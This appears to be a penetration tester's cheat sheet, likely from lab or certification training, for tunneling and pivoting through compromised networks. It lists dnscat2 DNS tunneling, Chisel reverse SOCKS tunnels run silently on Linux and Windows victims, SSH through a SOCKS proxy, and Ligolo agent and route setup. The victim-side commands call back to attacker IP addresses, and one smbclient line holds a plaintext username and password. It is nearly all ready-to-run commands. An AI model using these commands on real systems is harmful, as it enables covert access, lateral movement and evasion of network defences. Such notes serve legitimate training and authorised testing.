### DNS Tunneling with dnscat2
```
On DNS/Authoritative Name Server in WAN:
	- dnscat2-server feline.corp
On host in DMZ:
	- ./dnscat feline.corp
On DNS/Authoritative Name Server in WAN with dnscat shell:
	- listen 127.0.0.1:4455 172.16.2.11:445
On attacker on another machine?:
	- smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

### Chisel
```
On attacker:
	- ./chisel server -port 8090 --reverse
On victim (linux):
	- /tmp/chisel client 192.168.45.187:8090 R:socks > /dev/null 2>&1 &
On victim (windows):
	- cmd /d 'chisel.exe client <attacker address>:8080 R:80:172.16.80.241:80'
		- first IP: attacker address+port
		- Then the port connecting on victim
		- Then the target IP and target port
On attacker, SSH into internal PC:
	- ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.223.215
```

**Reverse Dynamic Port Foward Onto Windows**
```
- On kali : ./chisel server --reverse --port 51234
	- e/tc/proxychains4.conf has:
		- socks5 127.0.0.1 50080
- On windows: cmd /d 'chisel.exe client 192.168.45.165:51234 R:50080:socks'
```

**Ligolo**
```
On Kali:
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.145.0/24 dev ligolo
sudo ./proxy -selfcert -laddr 0.0.0.0:8000

On Victim:
./agent.exe -connect 192.168.45.248:8000 -ignore-cert

On Kali:
session
? Specify a session : 1 - #1 - Unknown@WEB02 - 192.168.195.247:49887
start
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp

If need local port:
sudo ip route add 240.0.0.1/32 dev ligolo
```